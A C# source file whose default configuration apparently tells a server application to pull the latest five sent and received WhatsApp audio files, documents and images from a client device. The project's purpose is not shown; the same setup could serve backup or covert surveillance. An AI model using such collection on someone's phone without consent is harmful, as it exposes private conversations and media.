namespace WostupServer
{
    public sealed record TEConfig
    {
        public required bool Active { get; set; }
        public required TECategory[] Categories { get; set; }

        public static string GetDefaultConfig() 
        {
            return
                @"
                {
                    ""Active"": true,
                    ""Categories"": 
                    [
                        {
                            ""MediaRelativeClientPath"": true,
                            ""ClientSourcePath"": ""com.whatsapp/WhatsApp/Media/WhatsApp Audio"",
                            ""Limit"": 5,
                            ""Sort"": ""latest"",
                            ""ServerDestPath"": ""audio/received""
                        },
                        {
                            ""MediaRelativeClientPath"": true,
                            ""ClientSourcePath"": ""com.whatsapp/WhatsApp/Media/WhatsApp Audio/Sent"",
                            ""Limit"": 5,
                            ""Sort"": ""latest"",
                            ""ServerDestPath"": ""audio/sent""
                        },
                        {
                            ""MediaRelativeClientPath"": true,
                            ""ClientSourcePath"": ""com.whatsapp/WhatsApp/Media/WhatsApp Documents"",
                            ""Limit"": 5,
                            ""Sort"": ""latest"",
                            ""ServerDestPath"": ""doc/received""
                        },
                        {
                            ""MediaRelativeClientPath"": true,
                            ""ClientSourcePath"": ""com.whatsapp/WhatsApp/Media/WhatsApp Documents/Sent"",
                            ""Limit"": 5,
                            ""Sort"": ""latest"",
                            ""ServerDestPath"": ""doc/sent""
                        },
                        {
                            ""MediaRelativeClientPath"": true,
                            ""ClientSourcePath"": ""com.whatsapp/WhatsApp/Media/WhatsApp Images"",
                            ""Limit"": 5,
                            ""Sort"": ""latest"",
                            ""ServerDestPath"": ""img/received""
                        },
                        {
                            ""MediaRelativeClientPath"": true,
                            ""ClientSourcePath"": ""com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"",
                            ""Limit"": 5,
                            ""Sort"": ""latest"",
                            ""ServerDestPath"": ""img/sent""
                        }
                    ]
                }";
        }
    }
}
